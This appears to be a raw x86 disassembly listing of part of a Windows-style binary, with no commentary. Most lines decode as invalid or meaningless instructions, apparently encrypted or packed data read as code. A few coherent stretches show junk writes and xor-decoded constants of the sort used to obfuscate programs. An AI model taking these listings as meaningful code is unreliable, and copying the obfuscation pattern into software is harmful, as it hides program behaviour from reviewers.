  4061cd:	aaa    
  4061ce:	inc    ebp
  4061cf:	xor    BYTE PTR [edi+0x58],0x5b
  4061d3:	inc    esp
  4061d4:	retf   0xd743
  4061d7:	nop
  4061d8:	sbb    BYTE PTR [eax-0x1ec682f],0xd4
  4061df:	ins    DWORD PTR es:[edi],dx
  4061e0:	push   ebx
  4061e1:	mov    ds:0xf46ca1f8,eax
  4061e6:	mov    eax,0xae5c9c52
  4061eb:	sbb    edi,0xe16d7ddb
  4061f1:	leave  
  4061f2:	xor    ebx,DWORD PTR [edx]
  4061f4:	cmp    BYTE PTR [ebx+0x3273214b],dl
  4061fa:	(bad)  
  4061fb:	fsubr  st,st(5)
  4061fd:	mov    ecx,0x3e5a4947
  406202:	mov    bh,dl
  406204:	ret    
  406205:	dec    edi
  406206:	scas   eax,DWORD PTR es:[edi]
  406207:	pushf  
  406208:	push   es
  406209:	and    eax,0x8e0b791c
  40620e:	in     eax,0x88
  406210:	and    ah,dl
  406212:	hlt    
  406213:	mov    ah,0x70
  406215:	cwde   
  406216:	shr    DWORD PTR [ecx-0x56f47328],0xa6
  40621d:	push   ds
  40621e:	cmp    al,0x77
  406220:	mov    dl,ah
  406222:	sub    esi,eax
  406224:	std    
  406225:	inc    eax
  406226:	(bad)  [esi]
  406228:	cmp    al,0xe
  40622a:	push   esi
  40622b:	(bad)  
  40622c:	ds fs (bad) 
  40622f:	push   cs
  406230:	popa   
  406231:	xchg   esp,eax
  406232:	inc    edx
  406233:	popf   
  406234:	mov    dh,0xcc
  406236:	inc    ebp
  406237:	lahf   
  406238:	add    BYTE PTR cs:[eax+0x64],bh
  40623c:	xchg   esp,eax
  40623d:	dec    edi
  40623e:	dec    esp
  40623f:	cmp    ch,BYTE PTR [esi+0x61a69aa7]
  406245:	lods   al,BYTE PTR ds:[esi]
  406246:	inc    edi
  406247:	hlt    
  406248:	stos   BYTE PTR es:[edi],al
  406249:	adc    bl,bh
  40624b:	out    dx,al
  40624c:	lea    edi,[edx+0x7c]
  40624f:	scas   eax,DWORD PTR es:[edi]
  406250:	aas    
  406251:	jbe    0x4061fe
  406253:	cmp    bl,bl
  406255:	cmc    
  406256:	xchg   esp,eax
  406257:	jae    0x4062b4
  406259:	lahf   
  40625a:	push   cs
  40625b:	jb     0x4062bd
  40625d:	cdq    
  40625e:	ins    BYTE PTR es:[edi],dx
  40625f:	ret    
  406260:	shl    DWORD PTR [edx+edx*4-0x13],cl
  406264:	mov    cl,0xbc
  406266:	mov    ch,0x4c
  406268:	lods   eax,DWORD PTR ds:[esi]
  40626a:	call   0x634f03d3
  40626f:	and    BYTE PTR [esi+0x30],0xbb
  406273:	sti    
  406274:	fistp  DWORD PTR [eax+0x10]
  406277:	cld    
  406278:	sbb    al,BYTE PTR [ecx]
  40627a:	ss cld 
  40627c:	or     ecx,DWORD PTR [edx]
  40627e:	mov    cl,0x56
  406280:	outs   dx,BYTE PTR ds:[esi]
  406281:	add    BYTE PTR [eax+0x5f],ah
  406284:	(bad)  
  406285:	xchg   edi,eax
  406286:	mov    ch,0xd7
  406288:	xchg   esp,eax
  406289:	push   esp
  40628a:	mov    BYTE PTR [edi+0xc0386b1],ah
  406290:	pop    ebx
  406291:	sub    ecx,DWORD PTR [ebp-0x5b4e1474]
  406297:	jmp    0x40626f
  406299:	mov    edx,0x24cd2938
  40629e:	add    ecx,DWORD PTR [edi-0x70]
  4062a1:	cmp    ah,BYTE PTR [ecx]
  4062a3:	cmp    al,0x34
  4062a5:	in     eax,dx
  4062a6:	cs in  eax,0x7a
  4062a9:	sbb    ebp,ecx
  4062ab:	ds xchg esp,eax
  4062ad:	lds    eax,FWORD PTR [esi-0x31]
  4062b0:	fimul  DWORD PTR [eax+0x6f]
  4062b3:	ss jmp 0x82db:0x82624d50
  4062bb:	(bad)  
  4062bc:	and    DWORD PTR [ebp+0x70],ecx
  4062bf:	in     eax,dx
  4062c0:	mov    bl,0xa0
  4062c2:	call   FWORD PTR [edx+0x65]
  4062c5:	scas   eax,DWORD PTR es:[edi]
  4062c6:	jmp    0x406257
  4062c8:	js     0x4062ae
  4062ca:	xchg   edx,eax
  4062cb:	ins    DWORD PTR es:[edi],dx
  4062cc:	sbb    BYTE PTR [edx+edx*8-0x1c60437b],dh
  4062d3:	js     0x40633b
  4062d5:	xor    DWORD PTR [esi+esi*1+0x123952ea],ebp
  4062dc:	loop   0x4062a4
  4062de:	jecxz  0x4062f1
  4062e0:	aam    0x9d
  4062e2:	or     BYTE PTR [eax+0xe],bh
  4062e5:	scas   al,BYTE PTR es:[edi]
  4062e6:	sub    BYTE PTR [esi+0x734da27],ah
  4062ec:	mov    eax,ds:0xb04ef724
  4062f1:	std    
  4062f2:	mov    edi,0xc4cae05c
  4062f7:	sar    bh,0x46
  4062fa:	add    BYTE PTR ds:0x65202527,dh
  406300:	push   esi
  406301:	test   al,0xe6
  406303:	je     0x406336
  406305:	mov    ch,0x40
  406307:	xor    dh,ah
  406309:	out    0x59,eax
  40630b:	idiv   BYTE PTR [ecx-0x561979ec]
  406311:	ret    0x889
  406314:	lock xchg edi,eax
  406316:	mov    esi,0x520fd828
  40631b:	dec    esi
  40631c:	push   0xffffffb3
  40631e:	lock enter 0xa1e5,0x95
  406323:	pusha  
  406324:	out    dx,eax
  406325:	sub    BYTE PTR [edi+0x15],ch
  406328:	xor    BYTE PTR [edx+0x5c],dl
  40632b:	dec    BYTE PTR [esp+ebx*2]
  40632e:	lods   al,BYTE PTR ds:[esi]
  40632f:	mov    ch,0x4a
  406331:	clc    
  406332:	je     0x406345
  406334:	and    al,0x3d
  406336:	sbb    eax,0x862a56c0
  40633b:	xor    eax,0xd3698f9d
  406340:	rcl    DWORD PTR ds:0x7aea464a,1
  406346:	dec    BYTE PTR [eax+esi*8-0x50]
  40634a:	ret    0x83bb
  40634d:	pop    ecx
  40634e:	(bad)  
  40634f:	mov    eax,0x29880b28
  406354:	and    al,BYTE PTR [edi-0xd]
  406357:	js     0x4062fa
  406359:	iret   
  40635a:	push   ecx
  40635b:	mov    edi,0x1fae3c69
  406360:	aaa    
  406361:	push   ebx
  406362:	clc    
  406363:	shl    BYTE PTR [ecx+edi*2-0xb],0x17
  406368:	imul   edi,DWORD PTR [edx],0xfffffffa
  40636b:	iret   
  40636c:	cdq    
  40636d:	pop    edi
  40636e:	aaa    
  40636f:	test   DWORD PTR [edx-0x41c90585],ebx
  406375:	shl    BYTE PTR [edx+0x59ae4636],cl
  40637b:	xchg   esi,eax
  40637c:	jno    0x406306
  40637e:	outs   dx,DWORD PTR ds:[esi]
  40637f:	sbb    al,0x57
  406381:	test   eax,0x13e786af
  406386:	xchg   edx,eax
  406387:	loopne 0x406400
  406389:	jbe    0x406351
  40638b:	jmp    0x4063ac
  40638d:	sti    
  40638e:	loope  0x4063c0
  406390:	jp     0x40634e
  406392:	and    BYTE PTR [ebx-0x1e],bh
  406395:	xor    DWORD PTR [edx+0x175637e0],esi
  40639b:	cmc    
  40639c:	sub    BYTE PTR gs:[esp+ecx*1],0x93
  4063a1:	push   0xa92ddf32
  4063a6:	test   DWORD PTR [ebp-0x22],esi
  4063a9:	adc    ah,bl
  4063ab:	add    eax,0xfe1fe8d6
  4063b0:	inc    esi
  4063b1:	sti    
  4063b2:	ins    BYTE PTR es:[edi],dx
  4063b3:	jns    0x406416
  4063b5:	inc    edi
  4063b6:	shl    esi,0x3c
  4063b9:	mov    bl,0x7f
  4063bb:	(bad)  
  4063bc:	sar    BYTE PTR [edx],0xbd
  4063bf:	sbb    ebx,DWORD PTR [esi+esi*2-0x5a]
  4063c3:	icebp  
  4063c4:	mov    ds:0x2f01a943,al
  4063c9:	dec    edi
  4063ca:	jb     0x406402
  4063cc:	addr16 int3 
  4063ce:	(bad)  
  4063cf:	fild   WORD PTR [ecx-0x4d]
  4063d2:	mov    cs,ecx
  4063d4:	outs   dx,BYTE PTR ds:[esi]
  4063d5:	jg     0x406388
  4063d7:	stc    
  4063d8:	data16 adc al,dl
  4063db:	mov    gs,WORD PTR [esi-0x32f4e42d]
  4063e1:	add    DWORD PTR [ebx+ebx*4+0x5a3f06ec],0x37
  4063e9:	pop    eax
  4063ea:	jbe    0x4063e5
  4063ec:	ds enter 0xcb56,0x6b
  4063f1:	adc    DWORD PTR [edx],ebx
  4063f3:	xor    al,0x81
  4063f5:	(bad)  [edi+0x51]
  4063f8:	jne    0x406419
  4063fa:	mov    ah,0x4a
  4063fc:	inc    edx
  4063fd:	vpor   xmm3,xmm1,xmm6
  406401:	jmp    0x4063a0
  406403:	scas   al,BYTE PTR es:[edi]
  406404:	jo     0x4063b7
  406406:	daa    
  406407:	adc    DWORD PTR [edx+eax*4+0x8],edi
  40640b:	jge    0x406424
  40640d:	data16 sub al,0xe1
  406410:	data16 aam 0xa4
  406413:	sbb    eax,0xb3db89bc
  406418:	mov    WORD PTR [esi-0x27d9f6eb],cs
  40641e:	add    BYTE PTR [edx+0x61ec7067],dh
  406424:	add    dh,BYTE PTR [esp+eax*2-0x1d168e6d]
  40642b:	loop   0x406416
  40642d:	cwde   
  40642e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40642f:	push   edi
  406430:	sub    DWORD PTR [ebx-0xb19a78],edi
  406436:	mov    dl,0xf
  406438:	inc    ebx
  406439:	or     DWORD PTR [ebp+esi*4-0x75],eax
  40643d:	sub    al,bl
  40643f:	jnp    0x40647a
  406441:	ins    BYTE PTR es:[edi],dx
  406442:	retf   0x7abc
  406445:	xchg   ecx,eax
  406446:	mov    DWORD PTR [ebp-0x20],eax
  406449:	xor    DWORD PTR ds:0x434386,0x4326f4
  406453:	mov    DWORD PTR [ebp-0x28],0xf89cb531
  40645a:	mov    DWORD PTR [ebp-0x34],0xf89f0531
  406461:	mov    DWORD PTR [ebp-0x2c],0xf89c85f1
  406468:	xor    DWORD PTR ds:0x432de2,edx
  40646e:	mov    DWORD PTR [ebp-0x24],0xf89c85d1
  406475:	xor    eax,DWORD PTR ds:0x43439a
  40647b:	mov    eax,DWORD PTR [ebp-0xc]
  40647e:	sub    DWORD PTR ds:0x432de2,0x4326f0
  406488:	xor    eax,esi
  40648a:	add    DWORD PTR ds:0x4326f0,0x5eb6
  406494:	add    eax,edi
  406496:	adc    DWORD PTR ds:0x432dd6,0x2bbb
  4064a0:	mov    DWORD PTR [ebp-0x18],eax
  4064a3:	mov    DWORD PTR [ebp-0x1c],0xf89c853c
  4064aa:	sbb    eax,0x6f73
  4064af:	mov    BYTE PTR [ebp-0x1],0x67
  4064b3:	or     eax,0xf78
  4064b8:	mov    eax,DWORD PTR [ebp-0xc]
  4064bb:	xor    eax,esi
  4064bd:	add    eax,edi
  4064bf:	mov    DWORD PTR [ebp-0x18],eax
  4064c2:	neg    eax
  4064c4:	mov    eax,DWORD PTR [ebp-0x24]
  4064c7:	sbb    DWORD PTR ds:0x4326ec,0x6660
  4064d1:	xor    eax,esi
  4064d3:	add    eax,edi
  4064d5:	sub    DWORD PTR ds:0x43442d,0x50c
  4064df:	push   eax
  4064e0:	sbb    DWORD PTR ds:0x4326f0,edx
  4064e6:	mov    eax,DWORD PTR [ebp-0x28]
  4064e9:	sub    DWORD PTR ds:0x432dd2,0x7292
  4064f3:	xor    eax,esi
  4064f5:	adc    DWORD PTR ds:0x43438e,0x434415
  4064ff:	add    eax,edi
  406501:	push   eax
  406502:	add    DWORD PTR ds:0x434386,ebx
  406508:	mov    eax,DWORD PTR [ebp-0x1c]
  40650b:	add    DWORD PTR ds:0x432dbe,0x432de6
  406515:	xor    eax,esi
  406517:	add    eax,edi
  406519:	add    DWORD PTR ds:0x434411,0x43441d
  406523:	push   eax
  406524:	lea    eax,[ebp-0x78]
  406527:	push   eax
  406528:	push   DWORD PTR [ebp-0xc]
  40652b:	adc    DWORD PTR ds:0x434386,0x78bf
  406535:	push   DWORD PTR [ebp-0x14]
  406538:	call   0x4055a2
  40653d:	sub    DWORD PTR ds:0x43439a,0x4326fc
  406547:	jmp    0x406894
  40654c:	test   al,0x25
  40654e:	xor    al,0x4
  406550:	mov    cl,0x11
  406552:	test   al,0xb1
  406554:	push   ebx
  406555:	fcmovb st,st(7)
  406557:	fild   WORD PTR [edx-0x24]
  40655a:	cmp    DWORD PTR es:[ebx+0x3e],ebp
  40655e:	jo     0x4065d0
  406560:	and    BYTE PTR [ebp+0x70],bh
  406563:	jo     0x4064ff
  406565:	out    0x3e,eax
  406567:	jae    0x4065a7
  406569:	div    BYTE PTR [edi-0x476f6efb]
  40656f:	es lahf 
  406571:	sub    ah,cl
  406573:	les    eax,FWORD PTR [esi-0x21687f6]
  406579:	fimul  WORD PTR [edi]
  40657b:	loop   0x406501
  40657d:	mov    eax,0x8cfeb685
  406582:	(bad)  
  406583:	jge    0x406547
  406585:	ficomp DWORD PTR [ebp-0x56]
  406588:	dec    edx
  406589:	xlat   BYTE PTR ds:[ebx]
  40658a:	popf   
  40658b:	test   ebp,esi
  40658d:	pusha  
  40658e:	xor    esp,DWORD PTR [edx]
  406590:	sti    
  406591:	nop
  406592:	pop    ebp
  406593:	scas   al,BYTE PTR es:[edi]
  406594:	push   0x6c616bc4
  406599:	shr    BYTE PTR [ecx],cl
  40659b:	pop    edx
  40659c:	and    DWORD PTR [bp+si],esi
  40659f:	mov    ebx,0xdbe44127
  4065a4:	sbb    al,0xc5
  4065a6:	pushf  
  4065a7:	fcmovnbe st,st(7)
  4065a9:	sbb    eax,0xc6507d12
  4065ae:	xchg   ebx,eax
  4065af:	or     bh,BYTE PTR ds:0x27982586
  4065b5:	xchg   ebp,eax
  4065b6:	sbb    eax,0x1abee741
  4065bb:	jmp    0xff89b8bd
  4065c0:	cld    
  4065c1:	int3   
  4065c2:	fwait
  4065c3:	xor    esi,DWORD PTR [edi+0x6765ef64]
  4065c9:	cmp    eax,DWORD PTR [eax-0x7d]
  4065cc:	test   dh,dl
  4065ce:	ins    DWORD PTR es:[edi],dx
  4065cf:	out    0x6e,al
  4065d1:	mov    gs,WORD PTR [ecx-0x3422ac0]
  4065d7:	cmp    eax,0x6651cf18
  4065dc:	mov    ebx,0xddc0d1c6
  4065e1:	xor    BYTE PTR [edx-0x7af36d09],bh
  4065e7:	add    BYTE PTR [ecx-0x23cbd526],bh
  4065ed:	mov    ds:0x5cc73062,al
  4065f2:	push   ebp
  4065f3:	mov    cl,ah
  4065f5:	xor    al,0xc4
  4065f7:	pop    ebp
  4065f8:	cmp    al,0x99
  4065fa:	nop
  4065fb:	enter  0x9fed,0x6f
  4065ff:	xchg   ecx,eax
  406600:	leave  
  406601:	cdq    
  406602:	sub    al,0x54
  406604:	in     eax,dx
  406605:	add    ecx,eax
  406607:	test   BYTE PTR ss:[eax-0x24],bl
  40660b:	pop    esi
  40660c:	sbb    ebp,DWORD PTR [ebx+0x73]
  40660f:	(bad)  
  406611:	int    0x6c
  406613:	das    
  406614:	je     0x406693
  406616:	sqrtps xmm2,XMMWORD PTR [ecx+0x73808d61]
  40661d:	(bad)  
  40661e:	or     ecx,DWORD PTR [esi-0xefa3174]
  406624:	jle    0x40666e
  406626:	out    0xb8,eax
  406628:	pop    ebp
  406629:	test   BYTE PTR [esi*1-0x3d3267fd],0xd2
  406631:	jmp    eax
  406633:	xchg   edx,eax
  406634:	pop    esi
  406635:	xor    edi,esp
  406637:	push   0xffffffb5
  406639:	shr    ch,1
  40663b:	push   cs
  40663c:	pusha  
  40663d:	or     BYTE PTR [ebp-0xb787de4],dl
  406643:	mov    dl,0xf4
  406645:	les    edx,FWORD PTR [ecx-0x79fd14df]
  40664b:	dec    esp
  40664c:	in     eax,dx
  40664d:	nop
  40664e:	xor    ecx,ecx
  406650:	fucomp st(2)
  406652:	(bad)  
  406653:	adc    eax,0x130c31e8
  406658:	scas   al,BYTE PTR es:[edi]
  406659:	cmp    edx,ecx
  40665b:	out    0xc4,eax
  40665d:	fcomp  DWORD PTR [eax]
  40665f:	ds loop 0x4065ea
  406662:	cli    
  406663:	xchg   ecx,eax
  406664:	or     dl,BYTE PTR [ebp-0x7a790368]
  40666a:	loopne 0x406605
  40666c:	std    
  40666d:	mov    ds:0x1277605,eax
  406672:	cmc    
  406673:	mov    ds:0x1ac535dd,al
  406678:	aad    0x63
  40667a:	loope  0x406666
  40667c:	imul   ebx,DWORD PTR [ecx-0x5e819117],0x4a343e07
  406686:	loope  0x4066ef
  406688:	shl    BYTE PTR ds:0x9df28c4e,1
  40668e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40668f:	xor    ebp,ebp
  406691:	mov    dh,0x6
  406693:	mov    cl,0x3
  406695:	push   eax
  406696:	inc    ebp
  406697:	pop    ds
  406698:	mov    al,BYTE PTR [eax-0x42]
  40669b:	jmp    0x2cd3e9d2
  4066a0:	push   eax
  4066a1:	ja     0x406661
  4066a3:	cdq    
  4066a4:	jg     0x4066ea
  4066a6:	sbb    bl,dh
  4066a8:	bound  ebp,QWORD PTR [edi+0x799a5cf1]
  4066ae:	dec    eax
  4066af:	jmp    0x38ac:0xdc988510
  4066b6:	sub    eax,0x43692feb
  4066bb:	or     al,0xc6
  4066bd:	push   cs
  4066be:	mov    ah,0x72
  4066c0:	mov    edx,0x82334e8f
  4066c5:	xchg   ecx,eax
  4066c6:	xor    eax,ecx
  4066c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4066c9:	adc    DWORD PTR [eax-0x2c45917d],eax
  4066cf:	dec    eax
  4066d0:	cmc    
  4066d1:	mov    ch,0x5f
  4066d3:	loopne 0x406711
  4066d5:	iret   
  4066d6:	push   ds
  4066d7:	pop    ss
  4066d8:	ret    
  4066d9:	call   0xe646488f
  4066de:	jns    0x406721
  4066e0:	add    BYTE PTR [esi],bh
  4066e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4066e3:	(bad)  
  4066e4:	fiadd  DWORD PTR ds:0xc95668e5
  4066ea:	mov    edi,DWORD PTR [edi]
  4066ec:	add    BYTE PTR [edi],0x10
  4066ef:	call   0x3ab508cd
  4066f4:	adc    eax,0xb16c6b20
  4066f9:	adc    esp,DWORD PTR [esi]
  4066fb:	sub    BYTE PTR [ecx-0x275d7998],cl
  406701:	out    0xa5,eax
  406703:	push   0x5a5d50de
  406708:	xchg   esi,eax
  406709:	add    DWORD PTR [eax],edi
  40670b:	pop    es
  40670c:	push   0x64
  40670e:	icebp  
  40670f:	int3   
  406710:	shl    edx,0xa9
  406713:	retf   
  406714:	aam    0x3a
  406716:	retf   0x45b
  406719:	pop    ebx
  40671a:	lods   eax,DWORD PTR ds:[esi]
  40671b:	fisub  WORD PTR [esi+edi*2]
  40671e:	adc    BYTE PTR [eax+0x39908960],dl
  406724:	adc    eax,0x38a88c91
  406729:	cwde   
  40672a:	(bad)  
  40672c:	aad    0xc9
  40672e:	call   0x9390:0xeb6bccd2
  406735:	xor    al,0xcd
  406737:	and    DWORD PTR [edi-0x51],esp
  40673a:	cdq    
  40673b:	outs   dx,DWORD PTR ds:[esi]
  40673c:	mov    edx,0x663bf4e2
  406741:	xor    BYTE PTR [ecx],dl
  406743:	cmp    DWORD PTR [edi],ecx
  406745:	xor    BYTE PTR [ebx],cl
  406747:	jno    0x406762
  406749:	mov    ebx,0x21c921ed
  40674e:	push   es
  40674f:	lea    ecx,[ebx-0x59]
  406752:	out    dx,eax
  406753:	loopne 0x4067d0
  406755:	adc    ebx,0xffffffea
  406758:	aaa    
  406759:	sub    al,0xed
  40675b:	repnz adc eax,0x2e27de1a
  406761:	pop    edi
  406762:	mov    ah,0x63
  406764:	cs xchg esp,eax
  406766:	dec    ebp
  406767:	pop    ebp
  406768:	sbb    BYTE PTR [edx],al
  40676a:	loop   0x406799
  40676c:	mov    esi,0x64c2db2d
  406771:	mov    esp,0x215905ef
  406776:	xchg   esp,eax
  406777:	jmp    0xbe9732d7
  40677c:	cmove  ecx,DWORD PTR [ebx-0x4f]
  406780:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406781:	je     0x4067ad
  406783:	inc    BYTE PTR [ebp+0x77084b40]
  406789:	or     bl,BYTE PTR [ecx]
  40678b:	push   eax
  40678c:	jae    0x406766
  40678e:	loope  0x406804
  406790:	inc    ecx
  406791:	pop    ecx
  406792:	sub    eax,0xb28f9985
  406797:	jmp    FWORD PTR [ebp+0x57]
  40679a:	jb     0x4067c4
  40679c:	sbb    BYTE PTR [ebx+0x28b9796d],ch
  4067a2:	mov    ebp,0xffb93a34
  4067a7:	adc    eax,0x3434ac2e
  4067ac:	add    eax,0x672bfa1c
  4067b1:	ffree  st(5)
  4067b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4067b4:	stc    
  4067b5:	pushf  
  4067b6:	and    eax,0x97e4a39d
  4067bb:	pop    esi
  4067bc:	dec    edx
  4067bd:	inc    ebx
  4067be:	pop    esi
  4067bf:	icebp  
  4067c0:	int    0x67
  4067c2:	and    BYTE PTR [esp+ebp*4-0x1d],ah
  4067c6:	in     al,dx
  4067c7:	hlt    
  4067c8:	sub    esi,eax
  4067ca:	xor    esp,DWORD PTR [eax]
  4067cc:	pushf  
  4067cd:	pushf  
  4067ce:	inc    edx
  4067cf:	mov    BYTE PTR [edi],0xda
  4067d2:	or     ch,BYTE PTR [ebx-0x13986d23]
  4067d8:	xor    DWORD PTR [esi],ecx
  4067da:	or     al,0x47
  4067dc:	add    eax,0x62ea5f97
  4067e1:	sub    BYTE PTR [edi],ch
  4067e3:	xor    eax,0xb58dde16
  4067e8:	(bad)  
  4067e9:	xor    BYTE PTR [bx+di-0x45c9],dl
  4067ee:	imul   eax,DWORD PTR [esi-0x2f],0xe78903b7
  4067f5:	aas    
  4067f6:	call   0x87ed:0xe09508eb
  4067fd:	cs xchg ebx,eax
  4067ff:	mov    dh,0xcc
  406801:	out    dx,eax
  406802:	dec    ecx
  406803:	inc    edx
  406804:	and    esp,DWORD PTR [ebx+0xa]
  406807:	cli    
  406808:	mov    eax,0x6169a952
  40680d:	sub    DWORD PTR [edi+0x6e06e4f],eax
  406813:	xchg   BYTE PTR [ebx+0x7592994],ch
  406819:	call   0xa9da0bba
  40681e:	shl    BYTE PTR [ebp+eiz*4-0x31d27374],1
  406825:	stos   BYTE PTR es:[edi],al
  406826:	shl    ah,0x89
  406829:	sbb    eax,0x6c1765d
  40682e:	sbb    eax,0x98661f5e
  406833:	stc    
  406834:	pop    ds
  406835:	(bad)  [ecx+0x1e7ce80d]
  40683b:	adc    edi,DWORD PTR [eax]
  40683d:	in     al,0xd6
  40683f:	into   
  406840:	xor    BYTE PTR [esi+ebp*2-0x24],0x1f
  406845:	jge    0x406890
  406847:	jns    0x4068a1
  406849:	mov    BYTE PTR [ecx],dh
  40684b:	mov    al,ds:0xd90bc75a
  406850:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406851:	and    DWORD PTR [eax-0x1c],esp
  406854:	out    dx,eax
  406855:	mov    esp,ebp
  406857:	fistp  WORD PTR [esi]
  406859:	stc    
  40685a:	aam    0x2f
  40685c:	cmp    al,0xc7
  40685e:	jmp    0xaff48e3d
  406863:	mov    ds:0xcd374ef4,eax
  406868:	mov    gs:0xe224e3bd,al
  40686e:	pop    esp
  40686f:	xor    eax,0x8e631510
  406874:	mov    esi,0x17fdf111
  406879:	xchg   edi,eax
  40687a:	imul   edx,DWORD PTR [edx*4-0x144daafc],0xa090ce7c
  406885:	hlt    
  406886:	mov    ds:0x71140467,al
  40688b:	xchg   DWORD PTR [eax],edi
  40688d:	hlt    
  40688e:	(bad)  
  40688f:	shl    BYTE PTR [edi+0x18],0x29
  406893:	mov    BYTE PTR [ebp+0x2505c7c0],0x44
  40689a:	inc    ebx
  40689b:	add    BYTE PTR [ecx+0x79],dh
  40689e:	add    BYTE PTR [eax],al
  4068a0:	je     0x406953
  4068a6:	lea    eax,[ebp-0x78]
  4068a9:	sbb    DWORD PTR ds:0x432dca,0x1ea3
  4068b3:	push   eax
  4068b4:	sbb    DWORD PTR ds:0x432de6,0x1ec2
  4068be:	mov    eax,DWORD PTR [ebp-0x14]
  4068c1:	and    DWORD PTR ds:0x432de2,0x7d59
  4068cb:	xor    eax,esi
  4068cd:	add    eax,edi
  4068cf:	push   eax
  4068d0:	mov    DWORD PTR ds:0x434366,0x11
  4068da:	cmp    DWORD PTR ds:0x434366,0x0
  4068e1:	je     0x406937
  4068e7:	cmp    DWORD PTR ds:0x434366,0x6
  4068ee:	jne    0x40690c
  4068f4:	push   0x434421
  4068f9:	push   DWORD PTR [ebp-0xc]
  4068fc:	push   0x55d8
  406901:	push   0x8f3f
  406906:	call   DWORD PTR ds:0x432c3a
  40690c:	cmp    DWORD PTR ds:0x434366,0x7
  406913:	jne    0x406924
  406919:	mov    eax,ds:0x434366
  40691e:	dec    eax
  40691f:	mov    ds:0x434366,eax
  406924:	xor    eax,eax
  406926:	add    eax,DWORD PTR ds:0x434366
  40692c:	dec    eax
  40692d:	mov    ds:0x434366,eax
  406932:	jmp    0x4068da
  406937:	mov    eax,DWORD PTR [ebp-0x10]
  40693a:	add    eax,0xaa
  40693f:	push   eax
  406940:	mov    eax,DWORD PTR [ebp-0x10]
  406943:	mov    eax,DWORD PTR [eax+0x198]
  406949:	push   DWORD PTR [eax]
  40694b:	call   0x40d076
  406950:	mov    DWORD PTR [ebp-0x8],eax
  406953:	cmp    DWORD PTR [ebp-0x8],0x0
  406957:	lea    eax,[ebp+0x4]
  40695a:	mov    DWORD PTR [ebp-0x20],eax
  40695d:	je     0x407755
  406963:	lea    eax,[ebp-0x18]
  406966:	push   eax
  406967:	mov    eax,DWORD PTR [ebp-0x2c]
  40696a:	xor    eax,esi
  40696c:	add    eax,edi
  40696e:	push   eax
  40696f:	mov    eax,DWORD PTR [ebp-0x1c]
  406972:	xor    eax,esi
  406974:	add    eax,edi
  406976:	push   eax
  406977:	push   DWORD PTR [ebp-0x8]
  40697a:	lea    eax,[ebp-0x78]
  40697d:	push   eax
  40697e:	jmp    0x406ccb
  406983:	mov    esi,?
  406985:	add    BYTE PTR [esi+0xa],bh
  406988:	mov    cs,WORD PTR [edx+0x39f75e8a]
  40698e:	aaa    
  40698f:	mov    ds:0x1b5a30dd,eax
  406994:	cmp    dh,BYTE PTR [eax+0x70]
  406997:	and    BYTE PTR [ebp+0x70],bh
  40699a:	jo     0x406933
  40699c:	(bad)  
  40699d:	mov    dl,0xff
  40699f:	mov    ds:0x34a9091f,eax
  4069a4:	jno    0x406931
  4069a6:	sbb    al,ch
  4069a8:	imul   ecx,edx,0x49
  4069ab:	adc    DWORD PTR [esi],ebx
  4069ad:	mov    ebp,0xacb6ca0e
  4069b2:	xchg   ecx,eax
  4069b3:	(bad)  
  4069b5:	jns    0x4069b1
  4069b7:	repz lds esp,FWORD PTR [esi]
  4069ba:	jns    0x406973
  4069bc:	push   ebx
  4069bd:	push   0xae298b47
  4069c2:	xchg   edi,eax
  4069c3:	nop
  4069c4:	inc    ebx
  4069c5:	xchg   DWORD PTR [ecx-0x790c1784],esp
  4069cb:	push   esi
  4069cc:	mov    ch,0xb9
  4069ce:	pusha  
  4069cf:	mov    esi,0x37d51057
  4069d4:	xchg   cl,bl
  4069d6:	mov    dl,BYTE PTR [ecx]
  4069d8:	add    eax,0x9306c19d
  4069dd:	cmp    DWORD PTR ds:0x6f12f93c,eax
  4069e3:	push   ebx
  4069e4:	mov    DWORD PTR [ebx-0x6a],ecx
  4069e7:	or     eax,0x214bf0c4
  4069ec:	int3   
  4069ed:	ja     0x4069d6
  4069ef:	das    
  4069f0:	mov    BYTE PTR [edx+0x57],bl
  4069f3:	retf   
  4069f4:	cdq    
  4069f5:	dec    ebp
  4069f6:	add    ch,BYTE PTR [esi+0x6a2faa17]
  4069fc:	jne    0x406a6e
  4069fe:	pop    dx
  406a00:	mov    cl,0x80
  406a02:	loop   0x406a38
  406a04:	jmp    0x406a48
  406a06:	cmp    eax,0x19636763
  406a0b:	fs add eax,0xc389d7cc
  406a11:	mov    ds:0xe1333ea7,al
  406a16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406a17:	jo     0x406a11
  406a19:	adc    bl,ah
  406a1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406a1c:	test   al,0x41
  406a1e:	sti    
  406a1f:	cdq    
  406a20:	sub    eax,0x198464ef
  406a25:	in     al,dx
  406a26:	pop    ecx
  406a27:	stc    
  406a28:	dec    esi
  406a29:	lods   eax,DWORD PTR ds:[esi]
  406a2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406a2b:	mov    ah,0x5a
  406a2d:	dec    esp
  406a2e:	iret   
  406a2f:	mov    al,0x1c
  406a31:	xchg   ebp,eax
  406a32:	or     BYTE PTR fs:[ecx-0xb],0x22
  406a37:	stos   DWORD PTR es:[edi],eax
  406a38:	sub    al,0xab
  406a3a:	jmp    0xa98c2a73
  406a3f:	lds    esi,FWORD PTR [ebp-0x6f]
  406a42:	fstp   st(5)
  406a44:	adc    BYTE PTR [ebp+0x3e],bl
  406a47:	dec    eax
  406a48:	jg     0x406a98
  406a4a:	scas   eax,DWORD PTR es:[edi]
  406a4b:	fsub   QWORD PTR [ebx+0x441b6d88]
  406a51:	mov    al,ds:0x66774e32
  406a56:	enter  0xd665,0xda
  406a5a:	popf   
  406a5b:	pop    eax
  406a5c:	nop
  406a5d:	jge    0x4069e2
  406a5f:	dec    ebx
  406a60:	xchg   edx,eax
  406a61:	call   0x678b:0xd2d52823
  406a68:	(bad)  
  406a69:	pop    esi
  406a6a:	shl    DWORD PTR [esi*1-0x761c4b2f],cl
  406a71:	mov    esi,0xe4330da3
  406a76:	es pop es
  406a78:	ficomp WORD PTR [edi]
  406a7a:	rol    BYTE PTR [ebx],1
